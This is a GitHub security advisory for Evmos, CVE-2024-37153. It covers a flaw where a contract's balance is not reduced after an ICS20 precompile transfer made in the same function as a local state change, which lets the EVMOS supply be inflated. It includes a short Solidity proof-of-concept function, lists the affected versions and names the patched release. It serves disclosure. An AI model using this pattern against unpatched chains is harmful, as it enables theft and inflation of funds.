# Contract balance not updating correctly after interchain transaction

**GHSA**: GHSA-xgr7-jgq3-mhmc | **CVE**: CVE-2024-37153 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-670

**Affected Packages**:
- **github.com/evmos/evmos/v18** (go): <= 18.0.0
- **github.com/evmos/evmos/v17** (go): <= 17.0.1
- **github.com/evmos/evmos/v16** (go): <= 16.0.4
- **github.com/evmos/evmos/v15** (go): <= 15.0.0
- **github.com/evmos/evmos/v14** (go): <= 14.1.0
- **github.com/evmos/evmos/v13** (go): <= 13.0.2
- **github.com/evmos/evmos/v12** (go): <= 12.1.6
- **github.com/evmos/evmos/v11** (go): <= 11.0.2
- **github.com/evmos/evmos/v10** (go): <= 10.0.1
- **github.com/evmos/evmos/v9** (go): <= 9.1.0
- **github.com/evmos/evmos/v8** (go): <= 8.2.3
- **github.com/evmos/evmos/v7** (go): <= 7.0.0
- **github.com/evmos/evmos/v6** (go): <= 6.0.4

## Description

### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

### Details
We discovered a bug walking through how to liquid stake using Safe which itself is a contract. The bug only appears when there is a local state change together with an ICS20 transfer in the same function and uses the contract's balance, that is using the contract address as the `sender` parameter in an ICS20 transfer using the ICS20 precompile

### Proof of Concept
```solidity
// This function does not reduce the contract balance correctly but liquid stakes correctly 
function transfer(
        string memory sourcePort,
        string memory sourceChannel,
        string memory denom,
        uint256 amount,
        string memory receiver,
        string memory evmosReceiver
    ) external returns (uint64 nextSequence) {
        counter += 1; # Only happens when there is a local state update together with an ICS20 Transfer
        Height memory timeoutHeight =  Height(100, 100);
        string memory memo = buildLiquidStakeMemo(receiver, evmosReceiver);
        return ICS20_CONTRACT.transfer(
            sourcePort, 
            sourceChannel,
            denom,
            amount,
            address(this), # this is the sender address which is the contract
            receiver,
            timeoutHeight,
            0,
            memo
        );
    }
```

### Impact
This is in essence the "infinite money glitch" allowing contracts to double the supply of Evmos after each transaction.

### Severity

Based on [ImmuneFi Severity Classification System](https://immunefisupport.zendesk.com/hc/en-us/articles/13332717597585-Severity-Classification-System) the severity was evaluated to `Critical` since the attack could have lead to create new supply of EVMOS and therefore lead to Direct loss of funds's value.

### Patches

The issue has been patched in versions >=V18.1.0. 

## For more information
If you have any questions or comments about this advisory:

Reach out to the Core Team in [Discord](https://discord.gg/evmos)
Open a discussion in [evmos/evmos](https://github.com/evmos/evmos/discussions)
Email us at [security@evmos.org](mailto:security@evmos.org) for security questions

